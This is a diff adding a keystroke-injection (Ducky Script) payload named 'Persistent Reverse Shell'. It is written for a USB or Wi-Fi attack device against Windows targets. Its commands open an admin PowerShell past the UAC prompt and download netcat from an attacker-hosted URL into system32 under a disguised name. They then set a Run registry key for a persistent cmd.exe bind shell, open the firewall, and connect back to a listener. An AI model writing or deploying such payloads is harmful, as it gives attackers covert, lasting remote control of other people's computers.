@@ -1,0 +1,47 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Persistent Reverse Shell
+
+REM !! REQUIREMENTS !!
+REM UAC is passwordless or OFF
+REM You know the IP Address of the target machine. If you do not know the target IP use "Data Collection" script
+
+REM !! CHANGES REQUIRED !!
+REM <HOSTED_URL> - URL to where nc64.exe is hosted
+REM <IP_ADDR> - Change the IP to your listener IP
+REM <PORT>  - Port of listener
+
+REM If the script has run succesfully you can run "nc -nv <TARGET_IP_ADDR> <PORT>" to connect
+
+DEFAULTDELAY 150
+
+REM Open Powershell as Administrator (By passing only the UAC prompt not Password)
+GUI r
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+LEFT
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Set path to temp
+STRING $path = 'C:\windows\system32\'
+ENTER
+STRING Set-Location $path
+ENTER
+
+REM Create Persistent Netcat Shell
+STRING Invoke-Webrequest -URI http://<HOSTED_URL>/nc64.exe -OutFile 4323.exe
+ENTER
+STRING Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Av35rg4' -Value 'C:\windows\system32\4323.exe -Ldp <PORT> -e cmd.exe'
+ENTER
+STRING netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=<PORT>
+ENTER
+
+REM Connect to listener for initial connection (optional)
+STRING ./4323.exe <IP_ADDR> <PORT> -e cmd.exe -d
+ENTER
+
+REM Exit Powershell
+ALT F4
